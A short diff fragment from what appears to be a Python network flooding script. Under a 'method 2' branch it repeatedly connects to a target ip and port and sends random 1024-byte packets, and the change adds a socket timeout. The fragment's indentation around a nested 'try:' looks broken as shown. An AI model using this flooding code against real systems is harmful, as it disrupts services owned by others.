@@ -47,6 +47,7 @@ elif method == "2":
         try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
+            sock.settimeout(5)
             sock.connect((ip, port))
             sock.send(random._urandom(1024))
             sent += 1
